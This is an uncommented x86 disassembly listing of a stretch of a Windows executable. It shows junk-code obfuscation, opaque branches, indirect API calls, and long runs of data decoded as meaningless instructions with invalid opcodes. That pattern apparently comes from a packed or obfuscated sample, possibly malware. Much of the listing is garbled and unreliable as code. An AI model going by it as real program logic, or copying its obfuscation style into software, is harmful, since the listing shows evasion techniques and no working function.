  418fc2:	xor    edi,DWORD PTR ds:0x42819f
  418fc8:	sbb    edx,0x3d5c
  418fce:	xor    DWORD PTR ds:0x42838f,0x3cf0
  418fd8:	sub    edx,0x3f96
  418fde:	mov    eax,DWORD PTR [esp+0x10]
  418fe2:	mov    DWORD PTR [eax],ecx
  418fe4:	mov    edi,0xca79a565
  418fe9:	add    DWORD PTR ds:0x42819b,0x586a
  418ff3:	mov    DWORD PTR [esp+0x80],edi
  418ffa:	and    DWORD PTR ds:0x42817f,ecx
  419000:	mov    DWORD PTR [esp+0x84],esi
  419007:	cmp    DWORD PTR ds:0x42816f,0x0
  41900e:	mov    DWORD PTR ds:0x428183,0x4347
  419018:	mov    DWORD PTR ds:0x4281a7,0x6064
  419022:	mov    DWORD PTR ds:0x42828f,edi
  419028:	jmp    0x419076
  41902d:	mov    DWORD PTR ds:0x428263,edi
  419033:	mov    eax,0x1d71
  419038:	cmp    DWORD PTR ds:0x42816f,0x0
  41903f:	jl     0x419063
  419045:	push   DWORD PTR [ebp-0x18]
  419048:	push   DWORD PTR [ebp-0x28]
  41904b:	push   0x1442
  419050:	push   0x27e7
  419055:	call   DWORD PTR ds:0x428e0c
  41905b:	add    edx,edx
  41905d:	not    DWORD PTR ds:0x4282ff
  419063:	or     ecx,edx
  419065:	movzx  edx,BYTE PTR ds:0x42823b
  41906c:	or     DWORD PTR ds:0x42837f,edx
  419072:	sub    ecx,edx
  419074:	add    edx,edx
  419076:	mov    eax,DWORD PTR [esp+0x80]
  41907d:	adc    edx,0x23f1
  419083:	jmp    0x419452
  419088:	lock adc BYTE PTR [ecx],dh
  41908b:	fidiv  WORD PTR [ecx]
  41908d:	push   ds
  41908e:	push   ds
  41908f:	call   DWORD PTR [esi-0x388f3402]
  419095:	cmp    al,0xa3
  419097:	mov    esp,0x1816c33f
  41909c:	mov    esp,0x8181812
  4190a1:	int    0x46
  4190a3:	loope  0x419077
  4190a5:	jne    0x419091
  4190a7:	xchg   edx,eax
  4190a8:	fldenv [ecx]
  4190aa:	mov    dl,al
  4190ac:	ss inc eax
  4190ae:	or     ch,BYTE PTR [ebx-0x33]
  4190b1:	int3   
  4190b2:	pop    ecx
  4190b3:	ins    BYTE PTR es:[edi],dx
  4190b4:	lea    esi,[esi]
  4190b6:	dec    edi
  4190b7:	loope  0x41908c
  4190b9:	inc    esp
  4190ba:	or     DWORD PTR [edx-0x24ba7699],edi
  4190c0:	mov    eax,0x26ce110f
  4190c5:	js     0x419121
  4190c7:	sti    
  4190c8:	inc    ecx
  4190c9:	pop    esi
  4190ca:	imul   ecx,DWORD PTR [edi-0x5f],0x44dd8e5
  4190d1:	push   cs
  4190d2:	xchg   edi,eax
  4190d3:	push   0xffffffd6
  4190d5:	neg    DWORD PTR [eax+0x7baa7a96]
  4190db:	inc    eax
  4190dc:	loop   0x4190e8
  4190de:	adc    eax,0xc5a0fb22
  4190e3:	ror    DWORD PTR [esi+0x3d1f4125],0xd6
  4190ea:	adc    edx,DWORD PTR [ebx]
  4190ec:	sub    al,0x8f
  4190ee:	mov    ch,0xed
  4190f0:	in     al,dx
  4190f1:	cs fwait
  4190f3:	push   ecx
  4190f4:	mov    dl,0xc3
  4190f6:	ja     0x419139
  4190f8:	mov    esp,0x1cfec947
  4190fd:	aaa    
  4190fe:	xchg   esp,eax
  4190ff:	(bad)  
  419100:	pop    ebx
  419101:	popa   
  419102:	stc    
  419103:	outs   dx,BYTE PTR ds:[esi]
  419104:	jo     0x4190fc
  419106:	jbe    0x419091
  419108:	xor    eax,0x582960f1
  41910d:	adc    ah,dh
  41910f:	clc    
  419110:	hlt    
  419111:	mov    dh,bh
  419113:	sub    DWORD PTR [esi-0x44318a5d],0x63
  41911a:	cwde   
  41911b:	mov    bl,0xea
  41911d:	enter  0x703b,0x4a
  419121:	xor    DWORD PTR [esi+0x60],ecx
  419124:	dec    esi
  419125:	das    
  419126:	jmp    0x4190c8
  419128:	mov    ebp,?
  41912a:	jmp    0x6b57ba53
  41912f:	out    0xb4,eax
  419131:	call   0x36cc:0x3faa83f
  419138:	and    BYTE PTR [edx+0x5379f96f],bl
  41913e:	xchg   esp,eax
  41913f:	into   
  419140:	ins    DWORD PTR es:[edi],dx
  419141:	das    
  419142:	cwde   
  419143:	cmp    BYTE PTR [ebx],0xf9
  419146:	and    eax,DWORD PTR [ebx+ecx*8+0x29]
  41914a:	cdq    
  41914b:	ins    DWORD PTR es:[edi],dx
  41914c:	hlt    
  41914d:	data16 gs xor al,0x89
  419151:	ins    DWORD PTR es:[edi],dx
  419152:	add    DWORD PTR [eax-0x441d04ab],0x2ee59c15
  41915c:	mov    ah,ah
  41915e:	mov    bl,0x9d
  419160:	fnsave [edi-0x308d9456]
  419166:	(bad)  
  419167:	cmp    bh,BYTE PTR [ecx-0x2b]
  41916a:	inc    ebx
  41916b:	ins    DWORD PTR es:[edi],dx
  41916c:	xchg   edi,eax
  41916d:	sar    DWORD PTR [ecx+ebp*1+0x33b19ad9],cl
  419174:	and    BYTE PTR [esi+0x2d279d8f],bh
  41917a:	ins    DWORD PTR es:[edi],dx
  41917b:	cwde   
  41917c:	ins    DWORD PTR es:[edi],dx
  41917d:	dec    ebx
  41917e:	sbb    DWORD PTR [edi-0x41371933],ebp
  419184:	sub    BYTE PTR [edx-0x6dd2349a],ch
  41918a:	mov    dh,0x75
  41918c:	lock int3 
  41918e:	repz xor BYTE PTR [edx-0x1a],bh
  419192:	pop    es
  419193:	addr16 mov eax,ds:0x5e4
  419197:	lds    ebx,FWORD PTR [ebx+ecx*2+0x7e5ad775]
  41919e:	push   edx
  41919f:	sahf   
  4191a0:	adc    DWORD PTR [edi-0x350c513e],ebp
  4191a6:	xchg   esi,eax
  4191a7:	mov    gs,WORD PTR [ebx-0x761a7335]
  4191ad:	adc    BYTE PTR ds:0xd1939df1,0xb5
  4191b4:	mov    eax,ds:0x709d83db
  4191b9:	retf   0x4ce4
  4191bc:	sbb    al,0x72
  4191be:	sub    eax,0x25d4416
  4191c3:	or     al,0x61
  4191c5:	push   0xfffffffe
  4191c7:	pop    esp
  4191c8:	(bad)  
  4191c9:	push   esi
  4191ca:	dec    esp
  4191cb:	jnp    0x419246
  4191cd:	push   esi
  4191ce:	push   ds
  4191cf:	arpl   bx,di
  4191d1:	cmp    DWORD PTR [esi],esp
  4191d3:	fxch   st(3)
  4191d5:	cmc    
  4191d6:	push   ebp
  4191d7:	(bad)  
  4191d8:	jl     0x41922a
  4191da:	mov    DWORD PTR [ecx+edi*8-0x5a346fc8],eax
  4191e1:	cmp    DWORD PTR [ebp+0x54feb71a],edx
  4191e7:	std    
  4191e8:	loop   0x41916f
  4191ea:	stos   DWORD PTR es:[edi],eax
  4191eb:	adc    eax,0x152641c7
  4191f0:	addr16 push edx
  4191f2:	xor    ch,BYTE PTR [ebp+0x7cbfeef0]
  4191f8:	jmp    0x419230
  4191fa:	pop    esp
  4191fb:	aaa    
  4191fc:	xchg   edi,eax
  4191fd:	fild   QWORD PTR [ebp*4-0x5b1dfdb5]
  419204:	push   ebx
  419205:	inc    ebp
  419206:	iret   
  419207:	jne    0x419243
  419209:	out    dx,eax
  41920a:	xor    eax,DWORD PTR [edi+0x6c]
  41920d:	loope  0x4191f7
  41920f:	(bad)  
  419210:	xor    bh,BYTE PTR [edx+0x769f5f2b]
  419216:	mov    cl,0x63
  419218:	push   edx
  419219:	mov    esi,fs
  41921b:	mov    ebx,0x7702b1a8
  419220:	sub    al,0xab
  419222:	jmp    DWORD PTR [ecx-0x49]
  419225:	sub    DWORD PTR [edx],ebp
  419227:	or     BYTE PTR [eax+0x51],dh
  41922a:	pop    ebp
  41922b:	push   0xa6a529dd
  419230:	(bad)  
  419231:	mov    DWORD PTR [ecx+0x1c3876e3],ebx
  419237:	mov    edi,0xf1f0ce52
  41923c:	pop    ecx
  41923d:	cmp    eax,0xed620f66
  419242:	ret    0xe0e7
  419245:	cmp    BYTE PTR [ebx],dh
  419247:	adc    edx,DWORD PTR [ecx+ecx*1-0x4704eb00]
  41924e:	scas   al,BYTE PTR es:[edi]
  41924f:	xor    ebp,DWORD PTR es:[edi+0x4b340def]
  419256:	cmp    DWORD PTR [eax-0x79fe04a9],esp
  41925c:	xchg   ecx,eax
  41925d:	dec    esp
  41925e:	mov    ds:0x3ff88de4,eax
  419263:	es repz inc edi
  419266:	jg     0x4191fe
  419268:	rcl    esi,1
  41926a:	mov    ebp,0x755aee04
  41926f:	pusha  
  419270:	cs mov al,0xe1
  419273:	sahf   
  419274:	scas   al,BYTE PTR es:[edi]
  419275:	sub    cl,BYTE PTR [edx+0x60e07194]
  41927b:	and    al,0x66
  41927d:	adc    bl,BYTE PTR [ebx+esi*8]
  419280:	loopne 0x419258
  419282:	rcl    BYTE PTR [edx],0xa2
  419285:	xor    bl,BYTE PTR ss:[ecx+0x24]
  419289:	ror    DWORD PTR [ebp+0x3f],cl
  41928c:	fidivr WORD PTR [esi+0x26588eb1]
  419292:	sbb    BYTE PTR [edx+0x1],bh
  419295:	cwde   
  419296:	and    al,0xaa
  419298:	(bad)  
  41929a:	xor    DWORD PTR [esp+esi*1],0xffffffd6
  41929e:	cli    
  41929f:	add    BYTE PTR [ecx+ebx*8],ch
  4192a2:	test   eax,0xeeaabd2d
  4192a7:	scas   eax,DWORD PTR es:[edi]
  4192a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192a9:	inc    edx
  4192aa:	int3   
  4192ab:	pop    esi
  4192ac:	(bad)  
  4192ad:	(bad)  
  4192ae:	mov    al,0x97
  4192b1:	push   cs
  4192b2:	(bad)  
  4192b3:	shl    BYTE PTR [edi-0x7d],1
  4192b6:	inc    esi
  4192b7:	or     ebp,esp
  4192b9:	pop    ss
  4192ba:	mov    dl,0x82
  4192bc:	dec    esp
  4192bd:	mov    dh,0xa0
  4192bf:	push   ebx
  4192c0:	(bad)  
  4192c1:	call   0x61a8:0x2bec4c5d
  4192c8:	into   
  4192c9:	pop    ebp
  4192ca:	je     0x4192db
  4192cc:	(bad)  
  4192cd:	stc    
  4192ce:	ins    BYTE PTR es:[edi],dx
  4192cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192d0:	push   esi
  4192d1:	add    DWORD PTR [edi],esi
  4192d3:	lds    esi,FWORD PTR [edx+0x18379d09]
  4192d9:	jbe    0x419309
  4192db:	cdq    
  4192dc:	jno    0x4192e5
  4192de:	mov    dh,0x49
  4192e0:	rcl    bl,0x8d
  4192e3:	lock dec esp
  4192e5:	jnp    0x4192c3
  4192e7:	cwde   
  4192e8:	inc    ecx
  4192e9:	push   es
  4192ea:	jmp    0xd670:0xe39fd510
  4192f1:	cmp    BYTE PTR [esi-0x41],ch
  4192f4:	jecxz  0x419342
  4192f6:	les    ebx,FWORD PTR [ebp+0x2963a72b]
  4192fc:	fs add eax,0x91bc9ff0
  419302:	ret    
  419303:	(bad)  
  419304:	hlt    
  419305:	and    cl,al
  419307:	sub    eax,0xf7aec1a0
  41930c:	xor    eax,0xb3cb06c9
  419311:	xor    eax,0x2a7ffb18
  419316:	pop    esp
  419317:	lahf   
  419318:	dec    edx
  419319:	jo     0x419352
  41931b:	xchg   edi,eax
  41931c:	adc    esi,DWORD PTR [edi-0x7b628d5f]
  419322:	loopne 0x419310
  419324:	push   cs
  419325:	sub    bl,0x69
  419328:	dec    eax
  419329:	sub    al,0x7a
  41932b:	shl    DWORD PTR fs:[ebp+0x5b],0x14
  419330:	xor    dl,ah
  419332:	mov    ch,0x76
  419334:	push   esi
  419335:	aas    
  419336:	sub    ch,ch
  419338:	dec    edx
  419339:	add    eax,0xd9d7fc39
  41933e:	or     eax,0x6a44c7db
  419343:	out    0x9b,eax
  419345:	loope  0x41930d
  419347:	mov    edx,DWORD PTR [eax-0x997d13a]
  41934d:	push   ecx
  41934e:	add    al,0x2
  419350:	add    ebp,DWORD PTR [ebp-0x274dab43]
  419356:	sbb    dl,bh
  419358:	mov    dl,0xf3
  41935a:	dec    esi
  41935b:	adc    eax,0xa4e8c457
  419360:	mov    ds:0x7528ca2f,eax
  419365:	cmp    dh,BYTE PTR [eax]
  419367:	stos   DWORD PTR es:[edi],eax
  419368:	fistp  QWORD PTR [eax-0x68]
  41936b:	retf   0x6ff7
  41936e:	out    0xfe,al
  419370:	pop    es
  419371:	mov    ds:0x1e557a2b,al
  419376:	cwde   
  419377:	inc    eax
  419378:	add    BYTE PTR [edi+0x71753925],dh
  41937e:	outs   dx,BYTE PTR ds:[esi]
  41937f:	sbb    BYTE PTR [edi-0x1c5a5852],0xd3
  419386:	adc    DWORD PTR [edx-0x2b],ebp
  419389:	pop    edi
  41938a:	xor    edi,DWORD PTR [edx]
  41938c:	jge    0x419369
  41938e:	aam    0x39
  419390:	outs   dx,WORD PTR ds:[esi]
  419392:	fcom   st(6)
  419394:	mov    ds:0x8c0b9769,al
  419399:	xlat   BYTE PTR ds:[ebx]
  41939a:	xchg   edi,eax
  41939b:	xor    esi,edi
  41939d:	push   eax
  41939e:	retf   
  41939f:	mov    dh,0x3e
  4193a1:	sub    al,0x95
  4193a3:	and    eax,ebp
  4193a5:	inc    edi
  4193a6:	mov    edx,0xe4169328
  4193ab:	in     al,dx
  4193ac:	xchg   bh,ah
  4193ae:	sbb    al,0xc7
  4193b0:	aaa    
  4193b1:	and    cl,BYTE PTR [edx-0x1b]
  4193b4:	idiv   BYTE PTR [esi-0x7a]
  4193b7:	jl     0x419423
  4193b9:	push   0xe2cbcb27
  4193be:	outs   dx,BYTE PTR ds:[esi]
  4193bf:	push   0xe97248fc
  4193c4:	(bad)  
  4193c5:	scas   al,BYTE PTR es:[edi]
  4193c6:	sub    eax,ebp
  4193c8:	cmp    al,0xee
  4193ca:	stos   BYTE PTR es:[edi],al
  4193cb:	cmp    eax,DWORD PTR [ecx+eax*1+0x2d]
  4193cf:	pushf  
  4193d0:	jae    0x4193b8
  4193d2:	mov    dl,0xbe
  4193d4:	inc    ebx
  4193d5:	or     ebp,DWORD PTR [esp+edx*4-0x4497b78d]
  4193dc:	std    
  4193dd:	div    DWORD PTR [esp+edx*2+0x74571b19]
  4193e4:	inc    esp
  4193e5:	mov    ecx,0x455f0a19
  4193ea:	fcom   st(5)
  4193ec:	outs   dx,DWORD PTR ds:[esi]
  4193ed:	xchg   BYTE PTR [edx-0x5e1d650e],al
  4193f3:	and    edx,edi
  4193f5:	mov    BYTE PTR [ebx-0x66199c71],dl
  4193fb:	je     0x41945d
  4193fd:	int3   
  4193fe:	ds cli 
  419400:	push   eax
  419401:	xor    al,0x54
  419403:	fiadd  WORD PTR [ecx+0x44c30b23]
  419409:	adc    eax,0xe704ac1b
  41940e:	mov    BYTE PTR [esi+0x1312a021],dl
  419414:	jecxz  0x4193d3
  419416:	push   ds
  419417:	and    eax,0x69069fc7
  41941c:	scas   eax,DWORD PTR es:[edi]
  41941d:	add    eax,0x7f7e3e2f
  419422:	and    al,0xa2
  419424:	xchg   DWORD PTR [eax+0x57],esp
  419427:	or     eax,DWORD PTR [ebx+0x48]
  41942a:	mov    dl,0x50
  41942c:	push   ss
  41942d:	les    ebp,FWORD PTR [eax]
  41942f:	or     BYTE PTR [edi+0x32],bl
  419432:	bound  eax,QWORD PTR [ecx-0x48]
  419435:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  419437:	jg     0x41948f
  419439:	mov    esi,0x19f50f31
  41943e:	jae    0x41944f
  419440:	push   0xcab34328
  419445:	pop    eax
  419446:	imul   eax,DWORD PTR [ecx-0x475dfe28],0xffffffc1
  41944d:	aaa    
  41944e:	and    ecx,DWORD PTR [eax]
  419450:	(bad)  
  419452:	mov    ecx,DWORD PTR [esp+0x84]
  419459:	shrd   eax,ecx,0x2
  41945d:	cmp    DWORD PTR ds:0x42824f,0x0
  419464:	mov    DWORD PTR ds:0x4283a7,ebx
  41946a:	not    edx
  41946c:	not    edx
  41946e:	jmp    0x419554
  419473:	mov    edx,0x1545
  419478:	mov    DWORD PTR ds:0x4283b3,0x3a28
  419482:	cmp    DWORD PTR ds:0x42824f,0x0
  419489:	jae    0x4194bc
  41948f:	push   0x7047
  419494:	call   DWORD PTR ds:0x428e10
  41949a:	mov    DWORD PTR ds:0x42828b,0x5c93
  4194a4:	mov    edx,DWORD PTR ds:0x4282f3
  4194aa:	mov    edx,DWORD PTR [edx]
  4194ac:	sbb    DWORD PTR ds:0x42832b,edx
  4194b2:	mov    DWORD PTR ds:0x4282b3,0x52b1
  4194bc:	or     DWORD PTR ds:0x42818b,edx
  4194c2:	and    DWORD PTR ds:0x42838f,ecx
  4194c8:	cmp    DWORD PTR ds:0x428337,0x0
  4194cf:	mov    DWORD PTR ds:0x428337,0x47af
  4194d9:	mov    edx,0x1450
  4194de:	mov    edx,0x7667
  4194e3:	mov    DWORD PTR ds:0x4282b3,0x72a1
  4194ed:	jmp    0x419554
  4194f2:	mov    DWORD PTR ds:0x4283b3,0x1b74
  4194fc:	mov    DWORD PTR ds:0x42818f,0x3203
  419506:	cmp    DWORD PTR ds:0x428337,0x0
  41950d:	jge    0x41953e
  419513:	push   0x4280cb
  419518:	push   0x4280af
  41951d:	push   0x400000
  419522:	call   DWORD PTR ds:0x428ea4
  419528:	adc    DWORD PTR ds:0x428197,0x266f
  419532:	xor    DWORD PTR ds:0x42838f,ebx
  419538:	xor    DWORD PTR ds:0x428317,ecx
  41953e:	mov    DWORD PTR ds:0x428187,0x7c57
  419548:	adc    edx,DWORD PTR ds:0x428263
  41954e:	dec    DWORD PTR ds:0x428317
  419554:	shr    ecx,0x2
  419557:	mov    ecx,DWORD PTR [esp+0x80]
  41955e:	xor    DWORD PTR ds:0x428307,0x502d
  419568:	mov    edx,DWORD PTR [esp+0x84]
  41956f:	xor    eax,0x329e695d
  419574:	xor    DWORD PTR ds:0x42839b,0x4283b7
  41957e:	xor    edx,edx
  419580:	or     edx,eax
  419582:	cmp    DWORD PTR ds:0x42819f,0x0
  419589:	mov    DWORD PTR ds:0x42818f,0x514f
  419593:	mov    DWORD PTR ds:0x428193,0x65eb
  41959d:	mov    DWORD PTR ds:0x428243,0x8ef
  4195a7:	jmp    0x4195fe
  4195ac:	mov    DWORD PTR ds:0x4282a3,0x70f3
  4195b6:	mov    eax,0x339d
  4195bb:	cmp    DWORD PTR ds:0x42819f,0x0
  4195c2:	jne    0x4195e8
  4195c8:	push   0x42805d
  4195cd:	push   0x428079
  4195d2:	call   DWORD PTR ds:0x428ea8
  4195d8:	adc    DWORD PTR ds:0x4282b7,ecx
  4195de:	and    DWORD PTR ds:0x4282ab,0x4c04
  4195e8:	add    DWORD PTR ds:0x428183,ebx
  4195ee:	and    DWORD PTR ds:0x42828f,0x6136
  4195f8:	add    DWORD PTR ds:0x428197,ebx
  4195fe:	mov    eax,ds:0x422568
  419603:	and    DWORD PTR ds:0x42831f,0x428287
  41960d:	push   edx
  41960e:	push   DWORD PTR [eax+0x19c]
  419614:	lea    eax,[esp+0x80]
  41961b:	sub    DWORD PTR ds:0x42817b,0x231c
  419625:	push   eax
  419626:	sub    DWORD PTR ds:0x4281a3,0x428177
  419630:	shl    ecx,0x1e
  419633:	and    DWORD PTR ds:0x428287,0x7ddf
  41963d:	call   0x415231
  419642:	lea    eax,[ebp+0x10]
  419645:	or     DWORD PTR ds:0x4282b7,0x7c72
  41964f:	push   eax
  419650:	mov    DWORD PTR [esp+0x14],edi
  419654:	mov    DWORD PTR [esp+0x18],esi
  419658:	lea    eax,[ebp+0xc]
  41965b:	push   eax
  41965c:	neg    DWORD PTR ds:0x42828f
  419662:	mov    DWORD PTR [esp+0x18],edi
  419666:	lea    eax,[ebp+0x8]
  419669:	add    DWORD PTR ds:0x4282a3,0x7c30
  419673:	mov    DWORD PTR [esp+0x1c],esi
  419677:	mov    DWORD PTR [esp+0x18],edi
  41967b:	adc    DWORD PTR ds:0x428193,0x428163
  419685:	mov    DWORD PTR [esp+0x1c],esi
  419689:	sbb    DWORD PTR ds:0x428297,0x42825f
  419693:	push   eax
  419694:	neg    DWORD PTR ds:0x42817b
  41969a:	call   0x40cc09
  41969f:	push   0x4
  4196a1:	and    DWORD PTR ds:0x42817b,0x428307
  4196ab:	push   0x4223ec
  4196b0:	sbb    DWORD PTR ds:0x428293,0x30c9
  4196ba:	push   DWORD PTR [esp+0x14]
  4196be:	sbb    DWORD PTR ds:0x42823b,0x560d
  4196c8:	call   0x415231
  4196cd:	sub    ecx,ebx
  4196cf:	mov    eax,DWORD PTR [esp+0xc]
  4196d3:	movzx  ebx,BYTE PTR ds:0x42824f
  4196da:	sbb    DWORD PTR ds:0x428333,ebx
  4196e0:	mov    ecx,DWORD PTR [esp+0xc]
  4196e4:	adc    DWORD PTR ds:0x428263,0x79e1
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	mov    ecx,DWORD PTR [ecx]
  4196f2:	shr    eax,0x1e
  4196f5:	add    DWORD PTR ds:0x42827f,ecx
  4196fb:	shl    ecx,0x2
  4196fe:	and    ebx,edx
  419700:	or     eax,ecx
  419702:	adc    DWORD PTR ds:0x42824b,ebx
  419708:	mov    ecx,DWORD PTR [esp+0xc]
  41970c:	cmp    DWORD PTR ds:0x428383,0x0
  419713:	mov    edx,DWORD PTR ds:0x4282ff
  419719:	mov    edx,0x8ae
  41971e:	mov    DWORD PTR ds:0x42827b,0x3b2
  419728:	jmp    0x419775
  41972d:	mov    DWORD PTR ds:0x428393,0x5836
  419737:	cmp    DWORD PTR ds:0x428383,0x0
  41973e:	jbe    0x419767
  419744:	push   DWORD PTR [ebp-0x24]
  419747:	call   DWORD PTR ds:0x428e14
  41974d:	movzx  edx,BYTE PTR ds:0x42817b
  419754:	adc    DWORD PTR ds:0x428303,edx
  41975a:	movzx  edx,BYTE PTR ds:0x4282b7
  419761:	add    DWORD PTR ds:0x42819b,edx
  419767:	and    edx,edx
  419769:	sub    ebx,edx
  41976b:	or     DWORD PTR ds:0x4282af,0x6a01
  419775:	xor    eax,0xa4069aae
  41977a:	cmp    DWORD PTR ds:0x42819b,0x0
  419781:	mov    DWORD PTR ds:0x428263,ebx
  419787:	mov    ebx,0x3314
  41978c:	jmp    0x4197fe
  419791:	mov    DWORD PTR ds:0x42827b,ebx
  419797:	cmp    DWORD PTR ds:0x42819b,0x0
  41979e:	jb     0x4197dd
  4197a4:	push   0x7db2
  4197a9:	push   0x7dda
  4197ae:	push   0x6d09
  4197b3:	push   DWORD PTR [ebp-0x20]
  4197b6:	push   DWORD PTR [ebp-0x28]
  4197b9:	call   DWORD PTR ds:0x428e18
  4197bf:	sub    DWORD PTR ds:0x428293,0x63b8
  4197c9:	add    DWORD PTR ds:0x42830f,0x42824f
  4197d3:	add    DWORD PTR ds:0x42826f,0x428197
  4197dd:	mov    ebx,DWORD PTR ds:0x4281b7
  4197e3:	xor    edx,edx
  4197e5:	add    edx,DWORD PTR ds:0x4282c7
  4197eb:	sub    ebx,edx
  4197ed:	sub    ebx,DWORD PTR [ebx+edx*1]
  4197f0:	sbb    ebx,ebx
  4197f2:	add    DWORD PTR ds:0x428247,ecx
  4197f8:	and    DWORD PTR ds:0x42829f,ecx
  4197fe:	mov    DWORD PTR [ecx],eax
  419800:	lea    eax,[esp+0x40]
  419804:	neg    edx
  419806:	mov    DWORD PTR [esp+0x98],eax
  41980d:	add    ecx,DWORD PTR ds:0x42831f
  419813:	lea    eax,[esp+0x98]
  41981a:	or     edx,0x537a
  419820:	mov    DWORD PTR [esp+0x9c],eax
  419827:	cmp    DWORD PTR ds:0x42819b,0x0
  41982e:	not    ebx
  419830:	mov    DWORD PTR ds:0x428387,0x7e9e
  41983a:	mov    edx,0x7e32
  41983f:	jmp    0x419909
  419844:	mov    DWORD PTR ds:0x428327,0x6cf
  41984e:	mov    DWORD PTR ds:0x4283b3,0x6551
  419858:	cmp    DWORD PTR ds:0x42819b,0x0
  41985f:	jge    0x41988b
  419865:	push   0x4cee
  41986a:	push   0x2107
  41986f:	push   0x820f
  419874:	push   DWORD PTR [ebp-0x10]
  419877:	call   DWORD PTR ds:0x428eac
  41987d:	adc    edx,edx
  41987f:	add    ecx,0x4be2
  419885:	and    ecx,0x5fef
  41988b:	mov    ebx,DWORD PTR ds:0x4283bb
  419891:	mov    ecx,DWORD PTR ds:0x4283bf
  419897:	sub    ebx,ecx
  419899:	or     ebx,DWORD PTR [ebx+ecx*1]
  41989c:	xor    ecx,DWORD PTR ds:0x4282ab
  4198a2:	cmp    DWORD PTR ds:0x42816f,0x0
  4198a9:	mov    DWORD PTR ds:0x428163,0x2b9c
  4198b3:	movzx  ecx,WORD PTR ds:0x42832f
  4198ba:	not    DWORD PTR ds:0x428323
  4198c0:	jmp    0x419909
  4198c5:	mov    edx,0x5053
  4198ca:	cmp    DWORD PTR ds:0x42816f,0x0
  4198d1:	jne    0x4198eb
  4198d7:	call   DWORD PTR ds:0x428e1c
  4198dd:	sbb    ecx,ecx
  4198df:	not    DWORD PTR ds:0x428293
  4198e5:	and    DWORD PTR ds:0x42832b,edi
  4198eb:	mov    edx,DWORD PTR ds:0x4282ff
  4198f1:	sbb    DWORD PTR ds:0x428187,edx
  4198f7:	or     DWORD PTR ds:0x428317,0x212d
  419901:	adc    edx,edx
  419903:	and    DWORD PTR ds:0x428283,edi
  419909:	mov    eax,DWORD PTR [esp+0x40]
  41990d:	sub    DWORD PTR [esp+0x40],eax
  419911:	mov    edx,DWORD PTR ds:0x42822f
  419917:	xor    ecx,ecx
  419919:	xor    ecx,DWORD PTR ds:0x428233
  41991f:	sub    edx,ecx
  419921:	or     edx,DWORD PTR [edx+ecx*1]
  419924:	lea    eax,[ebp+0x4]
  419927:	cmp    DWORD PTR ds:0x428327,0x0
  41992e:	mov    edx,0x60f5
  419933:	not    edx
  419935:	not    edx
  419937:	jmp    0x419a27
  41993c:	mov    DWORD PTR ds:0x42823b,0x4551
  419946:	mov    DWORD PTR ds:0x42829f,0x487
  419950:	cmp    DWORD PTR ds:0x428327,0x0
  419957:	jne    0x419988
  41995d:	push   0x803a
  419962:	push   DWORD PTR [ebp-0x18]
  419965:	push   DWORD PTR [ebp-0x1c]
  419968:	push   0x318a
  41996d:	push   DWORD PTR [ebp-0x20]
  419970:	call   DWORD PTR ds:0x428e20
  419976:	sbb    edx,ebx
  419978:	add    ecx,0x5f27
  41997e:	sbb    DWORD PTR ds:0x4282ff,0x75a
  419988:	sub    DWORD PTR ds:0x4282a7,0x2f43
  419992:	movzx  ecx,BYTE PTR ds:0x42824b
  419999:	sub    ecx,DWORD PTR ds:0x4283af
  41999f:	mov    DWORD PTR ds:0x42824b,ecx
  4199a5:	cmp    DWORD PTR ds:0x42826b,0x0
  4199ac:	mov    DWORD PTR ds:0x428303,0x47a6
  4199b6:	mov    edx,0x1bf3
  4199bb:	mov    DWORD PTR ds:0x42816b,0x10c7
  4199c5:	mov    DWORD PTR ds:0x428387,0x1d16
  4199cf:	jmp    0x419a27
  4199d4:	mov    DWORD PTR ds:0x42826b,edi
  4199da:	cmp    DWORD PTR ds:0x42826b,0x0
  4199e1:	jge    0x419a0f
  4199e7:	push   0x428243
  4199ec:	push   0x427f6b
  4199f1:	call   DWORD PTR ds:0x428eb0
  4199f7:	sub    DWORD PTR ds:0x4283b7,ecx
  4199fd:	mov    ecx,DWORD PTR ds:0x42832f
  419a03:	sbb    DWORD PTR ds:0x4282b7,ecx
  419a09:	adc    edx,DWORD PTR ds:0x42839b
  419a0f:	and    edx,0x987
  419a15:	adc    DWORD PTR ds:0x428317,0x29fb
  419a1f:	sbb    ecx,edx
  419a21:	xor    DWORD PTR ds:0x42830f,edi
  419a27:	xor    DWORD PTR [esp+0x40],eax
  419a2b:	mov    ebx,DWORD PTR ds:0x428327
  419a31:	xor    DWORD PTR ds:0x42823b,ebx
  419a37:	mov    DWORD PTR [esp+0x30],0x5b3d
  419a3f:	add    edx,0x5f01
  419a45:	mov    DWORD PTR [esp+0x34],0x4445
  419a4d:	sub    eax,DWORD PTR ds:0x42823f
  419a53:	mov    DWORD PTR [esp+0x10],0xa52
  419a5b:	mov    DWORD PTR [esp+0x14],0x1c69
  419a63:	mov    eax,DWORD PTR [esp+0x10]
  419a67:	jmp    0x419e36
  419a6c:	xchg   DWORD PTR [edi-0x63e03bea],ebp
  419a72:	inc    edx
  419a73:	sub    bh,BYTE PTR [edx-0x8f7006]
  419a79:	jg     0x419a06
  419a7b:	jo     0x419a60
  419a7d:	mov    ebx,0x12bc1816
  419a82:	sbb    BYTE PTR [eax],bl
  419a84:	out    0xc8,al
  419a86:	jecxz  0x419ab6
  419a88:	jo     0x419a6e
  419a8a:	cwde   
  419a8b:	call   0x6065eb0a
  419a90:	mov    eax,ds:0xf2d4d0e0
  419a95:	cmp    dh,bh
  419a97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a98:	mov    al,0xfa
  419a9a:	xchg   BYTE PTR [edx+ecx*1+0x5931a49b],cl
  419aa1:	adc    DWORD PTR [edi-0x3],eax
  419aa4:	xchg   ecx,eax
  419aa5:	in     eax,0x54
  419aa7:	pop    ebx
  419aa8:	test   eax,0xc9d1412a
  419aad:	xor    al,0xa5
  419aaf:	lods   al,BYTE PTR ds:[esi]
  419ab0:	dec    esi
  419ab1:	mov    dl,0x62
  419ab3:	pushf  
  419ab4:	sbb    al,0x3c
  419ab6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ab7:	mov    ecx,0xb38d0f62
  419abc:	cwde   
  419abd:	push   edi
  419abe:	pop    ebx
  419abf:	lods   al,BYTE PTR ds:[esi]
  419ac0:	enter  0xaaaf,0x64
  419ac4:	mov    ?,eax
  419ac6:	push   ecx
  419ac7:	aas    
  419ac8:	pusha  
  419ac9:	push   edx
